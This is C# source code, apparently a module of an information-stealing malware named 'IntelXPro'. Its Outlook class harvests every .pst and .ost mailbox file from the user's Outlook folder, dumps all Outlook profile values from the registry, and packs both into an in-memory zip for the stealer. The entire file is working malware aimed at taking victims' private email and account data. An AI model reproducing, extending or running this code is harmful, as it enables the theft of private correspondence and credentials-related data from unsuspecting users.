using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class Outlook : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Outlook";

            string outlookPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Outlook");
            if (Directory.Exists(outlookPath))
            {
                string[] pstFiles = Directory.GetFiles(outlookPath, "*.pst", SearchOption.AllDirectories);
                string[] ostFiles = Directory.GetFiles(outlookPath, "*.ost", SearchOption.AllDirectories);

                foreach (string pstFile in pstFiles)
                {
                    string fileName = Path.GetFileName(pstFile);
                    string targetPath = $"Outlook\\{fileName}";
                    zip.AddFile(targetPath, File.ReadAllBytes(pstFile));
                    counterApplications.Files.Add($"{pstFile} => {targetPath}");
                }

                foreach (string ostFile in ostFiles)
                {
                    string fileName = Path.GetFileName(ostFile);
                    string targetPath = $"Outlook\\{fileName}";
                    zip.AddFile(targetPath, File.ReadAllBytes(ostFile));
                    counterApplications.Files.Add($"{ostFile} => {targetPath}");
                }
            }

            using (RegistryKey outlookKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\Outlook\\Profiles"))
            {
                if (outlookKey != null)
                {
                    string[] profileNames = outlookKey.GetSubKeyNames();
                    foreach (string profileName in profileNames)
                    {
                        using (RegistryKey profileKey = outlookKey.OpenSubKey(profileName))
                        {
                            if (profileKey != null)
                            {
                                string profileInfo = $"Profile: {profileName}\n";
                                string[] valueNames = profileKey.GetValueNames();
                                foreach (string valueName in valueNames)
                                {
                                    object value = profileKey.GetValue(valueName);
                                    if (value != null)
                                    {
                                        profileInfo += $"{valueName}: {value}\n";
                                    }
                                }

                                string targetPath = $"Outlook\\Profile_{profileName}.txt";
                                zip.AddTextFile(targetPath, profileInfo);
                                counterApplications.Files.Add($"Registry\\{profileKey.Name} => {targetPath}");
                            }
                        }
                    }
                }
            }

            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
